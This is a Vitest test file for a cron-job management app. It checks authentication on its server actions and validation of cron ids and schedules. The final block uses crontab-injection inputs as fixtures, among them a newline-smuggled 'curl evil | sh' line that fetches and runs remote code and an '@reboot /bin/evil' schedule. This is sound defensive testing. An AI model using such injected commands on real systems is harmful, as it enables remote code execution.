import { beforeEach, describe, expect, it, vi } from "vitest";

const request = vi.hoisted(() => ({
  cookies: new Map<string, string>(),
  headers: new Map<string, string>(),
  outsideScope: false,
  validSessions: new Set<string>(),
}));

vi.mock("next/headers", () => ({
  cookies: vi.fn(async () => {
    if (request.outsideScope) throw new Error("cookies was called outside a request scope");
    return {
      get: (name: string) =>
        request.cookies.has(name) ? { name, value: request.cookies.get(name) } : undefined,
    };
  }),
  headers: vi.fn(async () => ({
    get: (name: string) => request.headers.get(name.toLowerCase()) ?? null,
  })),
}));

vi.mock("next/cache", () => ({ revalidatePath: vi.fn() }));

vi.mock("@/app/_utils/session-utils", () => ({
  getSessionCookieName: () => "cronmaster-session",
  validateSession: vi.fn(async (id: string) => request.validSessions.has(id)),
}));

vi.mock("@/app/_utils/cronjob-utils", () => ({
  getCronJobs: vi.fn(async () => []),
  addCronJob: vi.fn(async () => true),
  readUserCrontab: vi.fn(async () => ""),
  writeUserCrontab: vi.fn(async () => true),
  findJobIndex: vi.fn(() => -1),
  updateCronJob: vi.fn(async () => true),
}));

vi.mock("@/app/_utils/job-execution-utils", () => ({
  runJobSynchronously: vi.fn(),
  runJobInBackground: vi.fn(),
}));

vi.mock("@/app/_utils/snippets-utils", () => ({
  loadAllSnippets: vi.fn(async () => []),
  searchBashSnippets: vi.fn(() => []),
  getSnippetCategories: vi.fn(() => []),
}));

import { cookies } from "next/headers";
import { isApiKeyOnlyAuth, requireActionAuth } from "@/app/_utils/server-action-auth";
import * as cronjobUtils from "@/app/_utils/cronjob-utils";
import * as cronActions from "@/app/_server/actions/cronjobs";
import * as scriptActions from "@/app/_server/actions/scripts";
import * as logActions from "@/app/_server/actions/logs";
import * as snippetActions from "@/app/_server/actions/snippets";

beforeEach(() => {
  request.cookies.clear();
  request.headers.clear();
  request.validSessions.clear();
  request.outsideScope = false;
  vi.mocked(cookies).mockClear();
  vi.mocked(cronjobUtils.getCronJobs).mockClear();
  vi.mocked(cronjobUtils.readUserCrontab).mockClear();
  vi.mocked(cronjobUtils.addCronJob).mockClear();
  vi.mocked(cronjobUtils.updateCronJob).mockClear();
  vi.stubEnv("AUTH_PASSWORD", "");
  vi.stubEnv("SSO_MODE", "");
  vi.stubEnv("API_KEY", "");
  vi.spyOn(console, "warn").mockImplementation(() => {});
});

describe("isApiKeyOnlyAuth", () => {
  it("is only true when API_KEY is the sole protection", () => {
    expect(isApiKeyOnlyAuth()).toBe(false);
    vi.stubEnv("API_KEY", "k");
    expect(isApiKeyOnlyAuth()).toBe(true);
    vi.stubEnv("AUTH_PASSWORD", "pw");
    expect(isApiKeyOnlyAuth()).toBe(false);
    vi.stubEnv("AUTH_PASSWORD", "");
    vi.stubEnv("SSO_MODE", "oidc");
    expect(isApiKeyOnlyAuth()).toBe(false);
  });
});

describe("requireActionAuth", () => {
  it("is a no-op when no UI auth is configured, even with an API key", async () => {
    vi.stubEnv("API_KEY", "k");
    await expect(requireActionAuth()).resolves.toBeUndefined();
    expect(cookies).not.toHaveBeenCalled();
  });

  it("rejects calls without a valid session", async () => {
    vi.stubEnv("AUTH_PASSWORD", "pw");
    await expect(requireActionAuth()).rejects.toThrow("Unauthorized");

    request.cookies.set("cronmaster-session", "forged");
    await expect(requireActionAuth()).rejects.toThrow("Unauthorized");
  });

  it("accepts a valid session cookie", async () => {
    vi.stubEnv("SSO_MODE", "oidc");
    request.validSessions.add("real");
    request.cookies.set("cronmaster-session", "real");
    await expect(requireActionAuth()).resolves.toBeUndefined();
  });

  it("accepts the API key bearer used by the REST routes", async () => {
    vi.stubEnv("AUTH_PASSWORD", "pw");
    vi.stubEnv("API_KEY", "api-key");
    request.headers.set("authorization", "Bearer api-key");
    await expect(requireActionAuth()).resolves.toBeUndefined();

    request.headers.set("authorization", "Bearer wrong");
    await expect(requireActionAuth()).rejects.toThrow("Unauthorized");
  });

  it("fails closed when there is no request scope", async () => {
    vi.stubEnv("AUTH_PASSWORD", "pw");
    request.outsideScope = true;
    await expect(requireActionAuth()).rejects.toThrow("Unauthorized");
  });
});

describe("server actions enforce auth", () => {
  const calls: Array<[string, () => Promise<unknown>]> = [
    ["fetchCronJobs", () => cronActions.fetchCronJobs()],
    ["createCronJob", () => cronActions.createCronJob(new FormData())],
    ["editCronJob", () => cronActions.editCronJob(new FormData())],
    ["runCronJob", () => cronActions.runCronJob("abcd-1234")],
    ["executeJob", () => cronActions.executeJob("abcd-1234")],
    ["restoreCronJob", () => cronActions.restoreCronJob("x.job")],
    ["deleteBackup", () => cronActions.deleteBackup("x.job")],
    ["fetchScripts", () => scriptActions.fetchScripts()],
    ["getScriptContent", () => scriptActions.getScriptContent("x.sh")],
    ["createScript", () => scriptActions.createScript(new FormData())],
    ["getLogContent", () => logActions.getLogContent("abcd-1234", "a.log")],
    ["deleteLogFile", () => logActions.deleteLogFile("abcd-1234", "a.log")],
    ["getAllJobLogErrors", () => logActions.getAllJobLogErrors([])],
    ["fetchSnippets", () => snippetActions.fetchSnippets()],
  ];

  it.each(calls)("%s rejects anonymous callers when a password is set", async (_name, call) => {
    vi.stubEnv("AUTH_PASSWORD", "pw");
    await expect(call()).rejects.toThrow("Unauthorized");
    expect(cronjobUtils.getCronJobs).not.toHaveBeenCalled();
    expect(cronjobUtils.addCronJob).not.toHaveBeenCalled();
  });

  it("lets authenticated callers through", async () => {
    vi.stubEnv("AUTH_PASSWORD", "pw");
    request.validSessions.add("real");
    request.cookies.set("cronmaster-session", "real");
    await expect(cronActions.fetchCronJobs()).resolves.toEqual([]);
    expect(cronjobUtils.getCronJobs).toHaveBeenCalledOnce();
  });
});

describe("cron job action input validation", () => {
  const jobData = (id: string) => ({
    id,
    schedule: "* * * * *",
    command: "echo hi",
    user: "root",
  });

  it.each(["removeCronJob", "pauseCronJobAction", "resumeCronJobAction", "toggleCronJobLogging"] as const)(
    "%s refuses ids that would inject crontab lines",
    async (name) => {
      const result = await cronActions[name](jobData("abcd\n* * * * * curl evil | sh"));
      expect(result).toMatchObject({ success: false, message: "Invalid cron job id" });
      expect(cronjobUtils.readUserCrontab).not.toHaveBeenCalled();
      expect(cronjobUtils.updateCronJob).not.toHaveBeenCalled();
    }
  );

  it("createCronJob rejects multi-line schedules", async () => {
    const form = new FormData();
    form.set("schedule", "* * * * *\n* * * * * curl evil | sh");
    form.set("command", "echo hi");
    const result = await cronActions.createCronJob(form);
    expect(result).toMatchObject({ success: false, message: "Invalid cron schedule" });
    expect(cronjobUtils.addCronJob).not.toHaveBeenCalled();
  });

  it("editCronJob rejects schedules that smuggle a command", async () => {
    const form = new FormData();
    form.set("id", "abcd-1234");
    form.set("schedule", "@reboot /bin/evil");
    form.set("command", "echo hi");
    const result = await cronActions.editCronJob(form);
    expect(result).toMatchObject({ success: false, message: "Invalid cron schedule" });
    expect(cronjobUtils.updateCronJob).not.toHaveBeenCalled();
  });
});
